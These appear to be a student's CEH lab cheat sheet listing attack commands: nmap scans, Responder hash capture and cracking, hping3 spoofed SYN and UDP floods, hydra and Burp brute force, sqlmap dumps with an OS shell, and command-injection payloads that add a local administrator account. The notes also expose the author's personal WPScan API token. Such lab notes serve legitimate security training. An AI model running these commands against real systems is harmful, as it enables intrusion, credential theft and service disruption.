
Lab1-Task1: Host discovery
•	nmap -sn -PR [IP]
o	-sn: Disable port scan
o	-PR: ARP ping scan
•	nmap -sn -PU [IP]
o	-PU: UDP ping scan
•	nmap -sn -PE [IP or IP Range]
o	-PE: ICMP ECHO ping scan
•	nmap -sn -PP [IP]
o	-PP: ICMP timestamp ping scan
•	nmap -sn -PM [IP]
o	-PM: ICMP address mask ping scan
•	nmap -sn -PS [IP]
o	-PS: TCP SYN Ping scan
•	nmap -sn -PA [IP]
o	-PA: TCP ACK Ping scan
•	nmap -sn -PO [IP]
o	-PO: IP Protocol Ping scan
Lab2-Task3: Port and Service Discovery
•	nmap -sT -v [IP]
o	-sT: TCP connect/full open scan
o	-v: Verbose output
•	nmap -sS -v [IP]
o	-sS: Stealth scan/TCP hall-open scan
•	nmap -sX -v [IP]
o	-sX: Xmax scan
•	nmap -sM -v [IP]
o	-sM: TCP Maimon scan
•	nmap -sA -v [IP]
o	-sA: ACK flag probe scan
•	nmap -sU -v [IP]
o	-sU: UDP scan
•	nmap -sI -v [IP]
o	-sI: IDLE/IPID Header scan
•	nmap -sY -v [IP]
o	-sY: SCTP INIT Scan
•	nmap -sZ -v [IP]
o	-sZ: SCTP COOKIE ECHO Scan
•	nmap -sV -v [IP]
o	-sV: Detect service versions
•	nmap -A -v [IP]
o	-A: Aggressive scan
Lab3-Task2: OS Discovery
•	nmap -A -v [IP]
o	-A: Aggressive scan
•	nmap -O -v [IP]
o	-O: OS discovery
•	nmap –script smb-os-discovery.nse [IP]
o	-–script: Specify the customized script
o	smb-os-discovery.nse: Determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (Port 445 or 139)
Module 04: Enumeration
Lab2-Task1: Enumerate SNMP using snmp-check
•	nmap -sU -p 161 [IP]
•	snmp-check [IP]
Addition
•	nbtstat -a [IP] (Windows)
•	nbtstat -c
Module 06: System Hacking
Lab1-Task1: Perform Active Online Attack to Crack the System's Password using Responder
•	Linux:
o	cd
o	cd Responder
o	chmox +x ./Responder.py
o	sudo ./Responder.py -I eth0
o	passwd: ****
•	Windows
o	run
o	\CEH-Tools
•	Linux:
o	Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt
o	sudo snap install john-the-ripper
o	passwd: ****
o	sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt
Lab3-Task6: Covert Channels using Covert_TCP
•	Attacker:
o	cd Desktop
o	mkdir Send
o	cd Send
o	echo "Secret"->message.txt
o	Place->Network
o	Ctrl+L
o	smb://[IP]
o	Account & Password
o	copy and paste covert_tcp.c
o	cc -o covert_tcp covert_tcp.c
•	Target:
o	tcpdump -nvvx port 8888 -I lo
o	cd Desktop
o	mkdir Receive
o	cd Receive
o	File->Ctrl+L
o	smb://[IP]
o	copy and paste covert_tcp.c
o	cc -o covert_tcp covert_tcp.c
o	./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
o	Tcpdump captures no packets
•	Attacker
o	./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/send/message.txt
o	Wireshark (message string being send in individual packet)
Module 08: Sniffing
Lab2-Task1: Password Sniffing using Wireshark
•	Attacker
o	Wireshark
•	Target
o	www.moviescope.com
o	Login
•	Attacker
o	Stop capture
o	File-&gt;Save as
o	Filter: http.request.method==POST
o	RDP log in Target
o	service
o	start Remote Packet Capture Protocol v.0 (experimental)
o	Log off Target
o	Wireshark-&gt;Capture options-&gt;Manage Interface-&gt;Remote Interfaces
o	Add a remote host and its interface
o	Fill info
•	Target
o	Log in
o	Browse website and log in
•	Attacker
o	Get packets
Module 10: Denial-of-Service
Lab1-Task2: Perform a DoS Attack on a Target Host using hping3
•	Target:
o	Wireshark-&gt;Ethernet
•	Attacker
o	hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood
	-S: Set the SYN flag
	-a: Spoof the IP address
	-p: Specify the destination port
	--flood: Send a huge number of packets
•	Target
o	Check wireshark
•	Attacker (Perform PoD)
o	hping3 -d 65538 -S -p 21 –flood [Target IP]
	-d: Specify data size
	-S: Set the SYN flag
•	Attacker (Perform UDP application layer flood attack)
o	nmap -p 139 10.10.10.19 (check service)
o	hping3 -2 -p 139 –flood [IP]
	-2: Specify UDP mode
•	Other UDP-based applications and their ports
o	CharGen UDP Port 19
o	SNMPv2 UDP Port 161
o	QOTD UDP Port 17
o	RPC UDP Port 135
o	SSDP UDP Port 1900
o	CLDAP UDP Port 389
o	TFTP UDP Port 69
o	NetBIOS UDP Port 137,138,139
o	NTP UDP Port 123
o	Quake Network Protocol UDP Port 26000
o	VoIP UDP Port 5060
Module 13: Hacking Web Servers
Lab2-Task1: Crack FTP Credentials using a Dictionary Attack
•	nmap -p 21 [IP]
•	hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10
Module 14: Hacking Web Applications
Lab2-Task1: Perform a Brute-force Attack using Burp Suite
•	Set proxy for browser: 127.0.0.1:8080
•	Burpsuite
•	Type random credentials
•	capture the request, right click-&gt;send to Intrucder
•	Intruder-&gt;Positions
•	Clear $
•	Attack type: Cluster bomb
•	select account and password value, Add $
•	Payloads: Load wordlist file for set 1 and set 2
•	start attack
•	filter status==302
•	open the raw, get the credentials
•	recover proxy settings
Lab2-Task3: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications
•	Log in a website, change the parameter value (id )in the URL
•	Conduct a XSS attack: Submit script codes via text area
Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit
•	wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u
o	--enumerate u: Specify the enumeration of users
o	API Token: Register at https://wpscan.com/register
o	Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads
•	service postgresql start
•	msfconsole
•	use auxiliary/scanner/http/wordpress_login_enum
•	show options
•	set PASS_FILE password.txt
•	set RHOST 10.10.10.16
•	set RPORT 8080
•	set TARGETURI http://10.10.10.16:8080/CEH
•	set USERNAME admin
•	run
•	Find the credential
Lab2-Task6: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)
•	If found command injection vulnerability in an input textfield
•	| hostname
•	| whoami
•	| tasklist| Taskkill /PID /F
o	/PID: Process ID value od the process
o	/F: Forcefully terminate the process
•	| dir C:\
•	| net user
•	| net user user001 /Add
•	| net user user001
•	| net localgroup Administrators user001 /Add
•	Use created account user001 to log in remotely
Module 15: SQL Injection
Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
•	Login a website
•	Inspect element
•	Dev tools-&gt;Console: document.cookie
•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" –dbs
o	-u: Specify the target URL
o	--cookie: Specify the HTTP cookie header value
o	--dbs: Enumerate DBMS databases
•	Get a list of databases
•	Select a database to extract its tables
•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope –tables
o	-D: Specify the DBMS database to enumerate
o	--tables: Enumerate DBMS database tables
•	Get a list of tables
•	Select a column
•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope –T User_Login --dump
•	Get table data of this column
•	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" --os-shell
•	Get the OS Shell
•	TASKLIST
Module 17: Hacking Mobile Platforms
Lab 1-Task 4: Exploit the Android Platform through ADB using PhoneSploit
•	cd Phonesploit
•	python3 -m pip install colorama
•	python3 phonesploit.py
•	3
•	10.10.10.14
•	4
•	pwd
•	cd sdcard
•	cd Download
Module 20: Cryptography
Lab1-Task2: Calculate MD5 Hashes using MD5 Calculator
•	Nothing special
Lab4-Task1: Perform Disk Encryption using VeraCrypt
•	Click VeraCrypt
•	Create Volumn
•	Create an encrypted file container
•	Specify a path and file name
•	Set password
•	Select NAT
•	Move the mouse randomly for some seconds, and click Format
•	Exit
•	Select a drive, select file, open, mount
•	Input password
•	Dismount
•	Exit
Lab4-Task 2: Perform Disk Encryption using BitLocker Drive Encryption
Manage BitLocker/ New volume/Turn on BitLocker/ check Use a password to unlock the drive /input password/
Module Appendix: Covered Tools
•	Nmap
o	Multiple Labs
•	Hydra
o	Module 13: Lab2-Task1
•	Sqlmap
o	Module 15: Lab1-Task2
•	WPScan
o	Module 14: Lab2-Task5
o	wpscan –-url http://10.10.10.10 -t 50 -U admin -P rockyou.txt
•	Nikto
o	https://zhuanlan.zhihu.com/p/124246499
•	John
o	Module 06: Lab1-Task1
•	Hashcat
o	Crack MD5 passwords with a wordlist:
o	hashcat hash.txt -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
o	Crack MD5 passwords in a certain format:
o	hashcat -m 0 -a 3 ./hash.txt 'SKY-HQNT-?d?d?d?d'
o	https://xz.aliyun.com/t/4008
o	https://tools.kali.org/password-attacks/hashcat
•	Metasploit
o	Module 14: Lab2-Task5
•	Responder LLMNR
o	Module 06: Lab1-Task1
•	Wireshark or Tcpdump
o	Multiple Labs
•	Steghide
o	Hide
o	steghide embed -cf [img file] -ef [file to be hide]
o	steghide embed -cf 1.jpg -ef 1.txt
o	Enter password or skip
o	Extract
o	steghide info 1.jpg
o	steghide extract -sf 1.jpg
o	Enter password if it does exist
•	OpenStego
o	https://www.openstego.com/
•	QuickStego
o	Module 06: Lab0-Task1
•	Dirb (Web content scanner)
o	https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86
o	https://blog.csdn.net/weixin_44912169/article/details/105655195
•	Searchsploit (Exploit-DB)
o	https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/
•	Crunch (wordlist generator)
o	https://www.cnblogs.com/wpjamer/p/9913380.html
•	Cewl (URL spider)
o	https://www.freebuf.com/articles/network/190128.html
•	Veracrypt
o	Module 20: Lab4-Task1
•	Hashcalc
o	Module 20: Lab1-Task1 (Nothing special)
•	Rainbow Crack
o	Module 06: Lab0-Task0
•	Windows SMB
o	smbclient -L [IP]
o	smbclient \ip\sharename
o	nmap -p 445 -sV –script smb-enum-services [IP]
•	**Run Nmap at the beginning **
o	nmap -sn -PR 192.168.1.1/24 -oN ip.txt
o	nmap -A -T4 -vv -iL ip.txt -oN nmap.txt
o	nmap -sU -sV -A -T4 -v -oN udp.txt
•	Snow
•	./snow -C -p "magic" output.txt
•	snow -C -m "Secret Text Goes Here!" -p "magic" readme.txt readme2.txt • -m → Set your message • -p → Set your password
•	Rainbowcrack
o	Use Winrtgen to generate a rainbow table
o	Launch RainbowCrack
o	File->Load NTLM Hashes from PWDUMP File
o	Rainbow Table->Search Rainbow Table
o	Use the generated rainbow table
o	RainbowCrack automatically starts to crack the hashes QuickStego
o	Launch QuickStego
o	Open Image, and select target .jpg file
o	Open Text, and select a txt file
o	Hide text, save image file
o	Re-launch, Open Image
o	Select stego file
o	Hidden text shows up

